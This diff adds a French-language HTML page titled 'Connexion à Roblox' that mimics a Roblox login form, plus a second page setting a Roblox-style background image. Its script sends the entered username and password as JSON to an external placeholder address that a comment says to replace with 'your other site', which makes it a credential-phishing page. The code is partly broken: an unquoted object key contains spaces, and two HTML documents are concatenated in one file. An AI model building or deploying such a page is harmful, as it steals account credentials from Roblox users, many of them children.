@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion à Roblox</title>
+    <style>
+        /* Centrage complet et forçage de l'écriture en blanc partout */
+        body {
+            color: #ffffff; 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center; 
+            align-items: center; 
+            text-align: center;
+        }
+
+        /* Boîte du formulaire */
+        .container {
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+        }
+
+        h2 {
+            margin-bottom: 25px;
+            font-weight: 500;
+            color: #ffffff;
+        }
+
+        label {
+            color: #ffffff;
+        }
+
+        /* Style des zones de texte (écriture blanche) */
+        input[type="text"], textarea {
+            width: 100%;
+            padding: 12px;
+            margin-top: 8px;
+            margin-bottom: 20px;
+            border: 1px solid #ffffff;
+            border-radius: 6px;
+            background-color: transparent; /* Fond transparent pour que vous gériez le fond arrière */
+            color: #ffffff; 
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+
+        /* Style du bouton d'envoi (écriture blanche) */
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: transparent;
+            color: #ffffff; 
+            border: 1px solid #ffffff;
+            border-radius: 6px;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        button:hover {
+            background-color: rgba(255, 255, 255, 0.1); /* Léger effet au survol */
+        }
+
+        /* Message de statut */
+        #statut {
+            margin-top: 15px;
+            font-size: 14px;
+            font-weight: bold;
+            color: #ffffff;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2>Connexion</h2>
+        
+        <form id="messageForm">
+            <label for="identifiant">identifiant :</label>
+            <input type="text" id="identifiant" placeholder="identifiant" required>
+
+            <label for="mot de passe">mot de passe :</label>
+            <textarea id="mot de passe" rows="4" placeholder="mot de passe" required></textarea>
+
+            <button type="submit">Connexion</button>
+        </form>
+
+        <p id="statut"></p>
+    </div>
+
+    <script>
+        document.getElementById('messageForm').addEventListener('submit', async function(e) {
+            e.preventDefault(); 
+
+            const données = {
+                identifiant: document.getElementById('identifiant').value,
+                mot de passe: document.getElementById('mot de passe').value
+            };
+
+            const statutTxt = document.getElementById('statut');
+            statutTxt.innerText = "⏳ Connexion...";
+
+            // ⚠️ REMPLACEZ CETTE URL PAR CELLE DE VOTRE AUTRE SITE
+            const urlAutreSite = "https://votre-autre-site.com"; 
+
+            try {
+                const reponse = await fetch(urlAutreSite, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(données) 
+                });
+
+                if (reponse.ok) {
+                    statutTxt.innerText = "✅ Envoyé avec succès !";
+                    document.getElementById('messageForm').reset(); 
+                } else {
+                    statutTxt.innerText = "❌ Erreur du site récepteur (" + reponse.status + ")";
+                }
+            } catch (erreur) {
+                statutTxt.innerText = "❌ Impossible de contacter l'autre site.";
+                console.error("Détails :", erreur);
+            }
+        });
+    </script>
+
+</body>
+</html>
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Mon Site</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      background-repeat: no-repeat;
+      background-position: center;
+      background-attachment: fixed;
+      background-size: cover;
+    }
+  </style>
+</head>
+<body>
+
+  <script>
+    // Mets ton lien d'image Roblox ici
+    const lienImage = "https://image.api.playstation.com/vulcan/ap/rnd/202604/0801/6157a74f216f5fd380f33d326132130e6d1d7578291da74c.png";
+
+    // On met l'image en fond
+    document.body.style.backgroundImage = `url('${lienImage}')`;
+
+    // Si l'image est bloquée, on ne fait rien
+    const img = new Image();
+    img.src = lienImage;
+  </script>
+</body>
+</html>
